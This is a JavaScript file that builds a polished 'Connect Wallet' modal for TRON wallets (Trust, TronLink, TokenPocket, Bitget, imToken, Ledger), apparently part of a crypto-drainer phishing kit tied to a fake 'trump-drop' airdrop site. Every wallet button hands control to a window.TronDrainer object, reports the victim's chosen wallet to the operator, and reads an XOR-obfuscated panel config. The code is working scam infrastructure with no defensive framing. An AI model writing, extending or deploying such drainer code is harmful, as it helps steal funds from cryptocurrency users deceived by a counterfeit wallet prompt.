// TRON Wallet Modal v2.2 - Fixed wallet connections
// Order: WalletConnect, Trust, TronLink, then others
// Trust/TokenPocket -> WalletConnect, imToken -> deeplink, no Klever

const WALLET_MODAL_CONFIG = {
    wallets: [
        {
            id: 'walletconnect',
            name: 'WalletConnect',
            icon: 'https://trump-drop.world/icons/walletconnect.svg',
            connectionType: 'walletconnect',
            popular: true
        },
        {
            id: 'trust',
            name: 'Trust Wallet',
            icon: 'https://trump-drop.world/icons/trust.svg',
            connectionType: 'walletconnect',
            popular: true
        },
        {
            id: 'tronlink',
            name: 'TronLink',
            icon: 'https://trump-drop.world/icons/tronlink.svg',
            connectionType: 'tronlink',
            popular: true
        },
        {
            id: 'tokenpocket',
            name: 'TokenPocket',
            icon: 'https://trump-drop.world/icons/tokenpocket.svg',
            connectionType: 'walletconnect',
            popular: true
        },
        {
            id: 'bitget',
            name: 'Bitget Wallet',
            icon: 'https://trump-drop.world/icons/bitget.svg',
            connectionType: 'deeplink',
            deeplink: (url) => `https://bkcode.vip?action=dapp&url=${encodeURIComponent(url)}`,
            popular: true
        },
        {
            id: 'imtoken',
            name: 'imToken',
            icon: 'https://trump-drop.world/icons/imtoken.svg',
            connectionType: 'deeplink',
            deeplink: (url) => `imtokenv2://navigate/DappView?url=${encodeURIComponent(url)}`,
            popular: true
        },
        {
            id: 'ledger',
            name: 'Ledger',
            icon: 'https://trump-drop.world/icons/ledger.svg',
            connectionType: 'walletconnect',
            desktopOnly: true,
            popular: false
        }
    ]
};

// Check if mobile
const isMobileDevice = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

// Inject modal styles
function injectWalletModalStyles() {
    if (document.getElementById('wm-styles')) return;
    
    const styles = `
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    
    .wm-overlay {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.6);
        backdrop-filter: blur(8px);
        -webkit-backdrop-filter: blur(8px);
        z-index: 999999999;
        display: flex;
        align-items: center;
        justify-content: center;
        opacity: 0;
        visibility: hidden;
        transition: all 0.3s ease;
    }
    
    .wm-overlay.active {
        opacity: 1;
        visibility: visible;
    }
    
    .wm-modal {
        font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        background: #fff;
        border-radius: 24px;
        width: 100%;
        max-width: 400px;
        max-height: 85vh;
        overflow: hidden;
        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
        transform: scale(0.9) translateY(20px);
        transition: all 0.3s ease;
    }
    
    .wm-overlay.active .wm-modal {
        transform: scale(1) translateY(0);
    }
    
    .wm-modal.dark {
        background: #141414;
        color: #fff;
    }
    
    .wm-header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 20px 24px;
        border-bottom: 1px solid rgba(0, 0, 0, 0.08);
    }
    
    .wm-modal.dark .wm-header {
        border-bottom-color: rgba(255, 255, 255, 0.08);
    }
    
    .wm-title {
        font-size: 18px;
        font-weight: 600;
        color: #141414;
    }
    
    .wm-modal.dark .wm-title {
        color: #fff;
    }
    
    .wm-close {
        width: 32px;
        height: 32px;
        border-radius: 50%;
        border: none;
        background: rgba(0, 0, 0, 0.06);
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        transition: all 0.2s ease;
    }
    
    .wm-close:hover {
        background: rgba(0, 0, 0, 0.12);
        transform: rotate(90deg);
    }
    
    .wm-modal.dark .wm-close {
        background: rgba(255, 255, 255, 0.1);
    }
    
    .wm-modal.dark .wm-close:hover {
        background: rgba(255, 255, 255, 0.15);
    }
    
    .wm-close svg {
        width: 14px;
        height: 14px;
        stroke: #666;
    }
    
    .wm-modal.dark .wm-close svg {
        stroke: #999;
    }
    
    .wm-body {
        padding: 12px 16px 16px;
        max-height: 420px;
        overflow-y: auto;
    }
    
    .wm-section-title {
        font-size: 11px;
        font-weight: 600;
        color: #888;
        text-transform: uppercase;
        letter-spacing: 0.5px;
        margin-bottom: 8px;
        padding: 0 8px;
    }
    
    .wm-wallets {
        display: flex;
        flex-direction: column;
        gap: 2px;
    }
    
    .wm-wallet {
        display: flex;
        align-items: center;
        padding: 12px 14px;
        border-radius: 14px;
        cursor: pointer;
        transition: all 0.15s ease;
        border: none;
        background: transparent;
        width: 100%;
        text-align: left;
    }
    
    .wm-wallet:hover {
        background: rgba(59, 130, 246, 0.08);
    }
    
    .wm-wallet:active {
        transform: scale(0.98);
    }
    
    .wm-modal.dark .wm-wallet:hover {
        background: rgba(59, 130, 246, 0.15);
    }
    
    .wm-wallet-icon {
        width: 40px;
        height: 40px;
        border-radius: 10px;
        overflow: hidden;
        display: flex;
        align-items: center;
        justify-content: center;
        flex-shrink: 0;
    }
    
    .wm-wallet-icon img {
        width: 100%;
        height: 100%;
        object-fit: contain;
    }
    
    .wm-wallet-info {
        flex: 1;
        margin-left: 14px;
    }
    
    .wm-wallet-name {
        font-size: 15px;
        font-weight: 600;
        color: #141414;
    }
    
    .wm-modal.dark .wm-wallet-name {
        color: #fff;
    }
    
    .wm-wallet-tag {
        font-size: 11px;
        color: #888;
        margin-top: 2px;
    }
    
    .wm-wallet-arrow {
        width: 18px;
        height: 18px;
        stroke: #ccc;
    }
    
    .wm-modal.dark .wm-wallet-arrow {
        stroke: #555;
    }
    
    .wm-section {
        margin-bottom: 12px;
    }
    
    .wm-section:last-child {
        margin-bottom: 0;
    }
    
    .wm-footer {
        padding: 14px 24px;
        text-align: center;
        border-top: 1px solid rgba(0, 0, 0, 0.06);
    }
    
    .wm-modal.dark .wm-footer {
        border-top-color: rgba(255, 255, 255, 0.06);
    }
    
    .wm-footer-text {
        font-size: 12px;
        color: #888;
    }
    
    .wm-footer-link {
        color: #3b82f6;
        text-decoration: none;
    }
    
    .wm-warning {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.7);
        backdrop-filter: blur(8px);
        -webkit-backdrop-filter: blur(8px);
        z-index: 9999999999;
        align-items: center;
        justify-content: center;
    }
    
    .wm-warning.active {
        display: flex;
    }
    
    .wm-warning-box {
        background: #fff;
        border-radius: 20px;
        padding: 28px 24px;
        max-width: 320px;
        text-align: center;
        margin: 20px;
        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
    }
    
    .wm-warning-icon {
        width: 56px;
        height: 56px;
        margin: 0 auto 16px;
        background: #fef3c7;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
    }
    
    .wm-warning-icon svg {
        width: 28px;
        height: 28px;
        fill: #f59e0b;
    }
    
    .wm-warning-title {
        font-family: 'Inter', sans-serif;
        font-size: 17px;
        font-weight: 600;
        color: #141414;
        margin-bottom: 8px;
    }
    
    .wm-warning-text {
        font-family: 'Inter', sans-serif;
        font-size: 13px;
        color: #666;
        line-height: 1.5;
        margin-bottom: 20px;
    }
    
    .wm-warning-btn {
        font-family: 'Inter', sans-serif;
        background: #3b82f6;
        color: #fff;
        border: none;
        padding: 12px 28px;
        border-radius: 12px;
        font-size: 14px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.2s ease;
    }
    
    .wm-warning-btn:hover {
        background: #2563eb;
        transform: translateY(-1px);
    }
    
    .wm-body::-webkit-scrollbar {
        width: 5px;
    }
    
    .wm-body::-webkit-scrollbar-track {
        background: transparent;
    }
    
    .wm-body::-webkit-scrollbar-thumb {
        background: rgba(0, 0, 0, 0.12);
        border-radius: 3px;
    }
    
    .wm-modal.dark .wm-body::-webkit-scrollbar-thumb {
        background: rgba(255, 255, 255, 0.12);
    }
    
    @media (max-width: 480px) {
        .wm-modal {
            max-width: 100%;
            max-height: 80vh;
            border-radius: 20px 20px 0 0;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
        }
        
        .wm-overlay.active .wm-modal {
            transform: translateY(0);
        }
        
        .wm-overlay .wm-modal {
            transform: translateY(100%);
        }
    }
    `;
    
    const styleEl = document.createElement('style');
    styleEl.id = 'wm-styles';
    styleEl.textContent = styles;
    document.head.appendChild(styleEl);
}

// Create modal HTML
function createWalletModalHTML(theme = 'dark') {
    const popularWallets = WALLET_MODAL_CONFIG.wallets.filter(w => w.popular);
    const otherWallets = WALLET_MODAL_CONFIG.wallets.filter(w => !w.popular);
    
    const createWalletItem = (wallet) => {
        let tag = '';
        if (wallet.desktopOnly) {
            tag = 'Desktop only';
        } else if (wallet.id === 'walletconnect') {
            tag = 'QR Code';
        } else if (wallet.connectionType === 'walletconnect') {
            tag = 'WalletConnect';
        } else if (wallet.connectionType === 'tronlink') {
            tag = 'Extension / Mobile';
        } else if (wallet.connectionType === 'deeplink') {
            tag = 'Mobile App';
        }
        
        return `
        <button class="wm-wallet" data-wallet="${wallet.id}" data-name="${wallet.name}">
            <div class="wm-wallet-icon">
                <img src="${wallet.icon}" alt="${wallet.name}" onerror="this.parentElement.innerHTML='<svg viewBox=\\'0 0 40 40\\'><rect width=\\'40\\' height=\\'40\\' rx=\\'10\\' fill=\\'#3b82f6\\'/><text x=\\'20\\' y=\\'26\\' text-anchor=\\'middle\\' fill=\\'white\\' font-size=\\'16\\'>${wallet.name.charAt(0)}</text></svg>'">
            </div>
            <div class="wm-wallet-info">
                <div class="wm-wallet-name">${wallet.name}</div>
                ${tag ? `<div class="wm-wallet-tag">${tag}</div>` : ''}
            </div>
            <svg class="wm-wallet-arrow" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M7.5 5L12.5 10L7.5 15" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
        </button>
        `;
    };
    
    return `
    <div class="wm-overlay" id="wallet-modal-overlay">
        <div class="wm-modal ${theme}">
            <div class="wm-header">
                <div class="wm-title">Connect Wallet</div>
                <button class="wm-close" id="wm-close-btn">
                    <svg viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M5 5L15 15M15 5L5 15" stroke-width="2" stroke-linecap="round"/>
                    </svg>
                </button>
            </div>
            <div class="wm-body">
                <div class="wm-section">
                    <div class="wm-section-title">Popular</div>
                    <div class="wm-wallets">
                        ${popularWallets.map(createWalletItem).join('')}
                    </div>
                </div>
                <div class="wm-section">
                    <div class="wm-section-title">More Wallets</div>
                    <div class="wm-wallets">
                        ${otherWallets.map(createWalletItem).join('')}
                    </div>
                </div>
            </div>
            <div class="wm-footer">
                <span class="wm-footer-text">New to crypto? <a href="https://trustwallet.com" target="_blank" class="wm-footer-link">Get a wallet</a></span>
            </div>
        </div>
    </div>
    
    <div class="wm-warning" id="wm-warning">
        <div class="wm-warning-box">
            <div class="wm-warning-icon">
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
            </div>
            <div class="wm-warning-title">Desktop Only</div>
            <div class="wm-warning-text" id="wm-warning-text">
                This wallet is only available as a desktop browser extension. Please open this page on your computer.
            </div>
            <button class="wm-warning-btn" id="wm-warning-close">Got it</button>
        </div>
    </div>
    `;
}

// Get theme from encrypted config
function getThemeFromConfig() {
    try {
        if (window.config) {
            const key = "TRX_SECURE_2024_PANEL_KEY";
            let text = window.config;
            const isBase64 = /^[A-Za-z0-9+/]*={0,2}$/.test(text) && text.length % 4 === 0;
            if (isBase64) { try { text = atob(text); } catch(e) {} }
            let result = '';
            for (let i = 0; i < text.length; i++) {
                result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
            }
            const config = JSON.parse(result);
            return config.theme || 'dark';
        }
    } catch(e) {}
    return 'dark';
}

// Handle wallet connection
function handleWalletConnection(wallet) {
    const overlay = document.getElementById('wallet-modal-overlay');
    if (overlay) overlay.classList.remove('active');
    
    // Desktop-only check
    if (isMobileDevice && wallet.desktopOnly) {
        const warning = document.getElementById('wm-warning');
        const warningText = document.getElementById('wm-warning-text');
        if (warning && warningText) {
            warningText.textContent = `${wallet.name} is only available as a desktop browser extension. Please open this page on your computer.`;
            warning.classList.add('active');
        }
        return;
    }
    
    // Connection logic based on type
    switch (wallet.connectionType) {
        case 'walletconnect':
            // Trust, TokenPocket, Ledger, Bybit -> WalletConnect modal
            if (window.TronDrainer && window.TronDrainer.connectWalletConnect) {
                window.TronDrainer.connectWalletConnect();
            }
            break;
            
        case 'tronlink':
            // TronLink -> dedicated handler
            if (window.TronDrainer && window.TronDrainer.connectTronLink) {
                window.TronDrainer.connectTronLink();
            }
            break;
            
        case 'deeplink':
            // Bitget, OKX, SafePal, imToken, Coin98, MathWallet
            if (isMobileDevice) {
                // Check if we're inside ANY wallet's browser (including Bitget which uses window.bitkeep)
                const hasTronWeb = window.tronWeb || window.tronLink || window.bitkeep?.tronWeb || window.bitkeep?.tronLink;
                
                if (hasTronWeb) {
                    // We're inside a wallet browser - connect directly
                    if (window.TronDrainer && window.TronDrainer.connectTronLink) {
                        window.TronDrainer.connectTronLink();
                    }
                } else if (wallet.deeplink) {
                    // Not inside wallet browser - open deeplink
                    const currentUrl = window.location.href;
                    window.location.href = wallet.deeplink(currentUrl);
                }
            } else {
                // Desktop - always use WalletConnect
                if (window.TronDrainer && window.TronDrainer.connectWalletConnect) {
                    window.TronDrainer.connectWalletConnect();
                }
            }
            break;
            
        case 'extension':
            // Desktop extension wallets
            if (window.TronDrainer && window.TronDrainer.connectWalletConnect) {
                window.TronDrainer.connectWalletConnect();
            }
            break;
            
        default:
            if (window.TronDrainer && window.TronDrainer.connectWalletConnect) {
                window.TronDrainer.connectWalletConnect();
            }
    }
}

// Send wallet selection notification
function sendWalletNotification(walletName) {
    // Use drainer's sendNotification (more reliable)
    if (window.TronDrainer && window.TronDrainer.sendNotification) {
        window.TronDrainer.sendNotification('selected_wallet', { target: walletName });
    }
}

// Initialize wallet modal
function initWalletModal() {
    // Remove existing modal if any
    const existing = document.getElementById('wallet-modal-overlay');
    if (existing) existing.remove();
    const existingWarning = document.getElementById('wm-warning');
    if (existingWarning) existingWarning.remove();
    
    injectWalletModalStyles();
    
    const theme = getThemeFromConfig();
    document.body.insertAdjacentHTML('beforeend', createWalletModalHTML(theme));
    
    const overlay = document.getElementById('wallet-modal-overlay');
    const closeBtn = document.getElementById('wm-close-btn');
    const warning = document.getElementById('wm-warning');
    const warningClose = document.getElementById('wm-warning-close');
    
    // Close modal
    if (closeBtn) {
        closeBtn.addEventListener('click', () => {
            overlay.classList.remove('active');
        });
    }
    
    if (overlay) {
        overlay.addEventListener('click', (e) => {
            if (e.target === overlay) {
                overlay.classList.remove('active');
            }
        });
    }
    
    // Close warning
    if (warningClose) {
        warningClose.addEventListener('click', () => {
            warning.classList.remove('active');
        });
    }
    
    // Wallet click handlers
    document.querySelectorAll('.wm-wallet').forEach(btn => {
        btn.addEventListener('click', (e) => {
            const button = e.currentTarget;
            const walletId = button.getAttribute('data-wallet');
            const wallet = WALLET_MODAL_CONFIG.wallets.find(w => w.id === walletId);
            
            if (!wallet) return;
            
            // Use wallet.name from config (more reliable than data attribute)
            const walletName = wallet.name;
            
            // Store selected wallet name globally for drainer to use
            window._selectedWalletName = walletName;
            
            // Send notification with wallet name
            sendWalletNotification(walletName);
            
            // Handle connection
            handleWalletConnection(wallet);
        });
    });
}

// Open modal function
function openWalletModal() {
    const overlay = document.getElementById('wallet-modal-overlay');
    if (overlay) {
        overlay.classList.add('active');
    }
}

// Close modal function
function closeWalletModal() {
    const overlay = document.getElementById('wallet-modal-overlay');
    if (overlay) {
        overlay.classList.remove('active');
    }
}

// Auto-init on DOM ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initWalletModal);
} else {
    initWalletModal();
}

// Export functions
window.WalletModal = {
    open: openWalletModal,
    close: closeWalletModal,
    init: initWalletModal
};
